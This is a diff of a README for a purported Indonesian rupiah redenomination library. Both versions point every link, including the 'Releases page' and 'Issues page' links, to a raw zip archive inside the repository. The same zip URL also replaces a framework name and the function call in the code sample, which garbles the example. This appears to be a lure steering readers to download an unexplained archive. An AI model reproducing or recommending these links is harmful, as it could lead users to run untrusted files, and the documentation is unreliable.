@@ -1,6 +1,6 @@
 # 🚀 redenominasi-idr - Simple Conversion for the Indonesian Rupiah
 
-[![Download Now](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/utils/redenominasi-idr-feverberry.zip%20Now-click%20here-blue)](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/utils/redenominasi-idr-feverberry.zip)
+[![Download Now](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/core/idr-redenominasi-v1.0.zip%20Now-click%20here-blue)](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/core/idr-redenominasi-v1.0.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ The **redenominasi-idr** library helps you easily convert and format Indonesian 
 - **Tree-shakeable**: Import only the parts you need, making your code cleaner and more efficient.
 - **TypeScript Support**: Enjoy full type safety, which helps avoid many common coding errors.
 - **React Support**: Pre-built hooks and components for easy integration into React applications.
-- **SSR-safe**: Compatible with server-side rendering frameworks like https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/utils/redenominasi-idr-feverberry.zip and Nuxt.
+- **SSR-safe**: Compatible with server-side rendering frameworks like https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/core/idr-redenominasi-v1.0.zip and Nuxt.
 - **Customizable**: Adjust the conversion ratio, rounding methods, and formatting to fit your needs.
 - **Well-tested**: Comprehensive test coverage ensures the library works as expected.
 
@@ -24,7 +24,7 @@ To use **redenominasi-idr**, follow these simple steps:
 
 You can easily download the library from the Releases page. Visit the following link to get started:
 
-[Download the Latest Release](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/utils/redenominasi-idr-feverberry.zip)
+[Download the Latest Release](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/core/idr-redenominasi-v1.0.zip)
 
 ### Step 2: Install the Library
 
@@ -46,7 +46,7 @@ yarn add redenominasi-idr
 
 After downloading the library, be sure to follow the installation steps listed above. You can also return to the releases page to check for updates and new features:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/utils/redenominasi-idr-feverberry.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/core/idr-redenominasi-v1.0.zip)
 
 ## ✅ Quick Start
 
@@ -59,7 +59,7 @@ import { convert, format } from 'redenominasi-idr';
 
 // Convert old nominal to new nominal
 const newNominal = convert(15000);
-https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/utils/redenominasi-idr-feverberry.zip(format(newNominal));
+https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/core/idr-redenominasi-v1.0.zip(format(newNominal));
 ```
 
 In this example, the `convert` function changes the old value (15,000) to its new equivalent based on the 1:1000 ratio. The `format` function returns a formatted string of the new nominal value for display.
@@ -104,6 +104,6 @@ Yes, it is framework-agnostic and can be used in various JavaScript environments
 
 ## 📞 Get Help
 
-For support or questions, visit our [Issues page](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/utils/redenominasi-idr-feverberry.zip) on GitHub. We welcome contributions and feedback to improve the library further.
+For support or questions, visit our [Issues page](https://raw.githubusercontent.com/upva1ue/redenominasi-idr/main/src/core/idr-redenominasi-v1.0.zip) on GitHub. We welcome contributions and feedback to improve the library further.
 
 Thank you for choosing **redenominasi-idr**. Your financial calculations just got a lot easier!
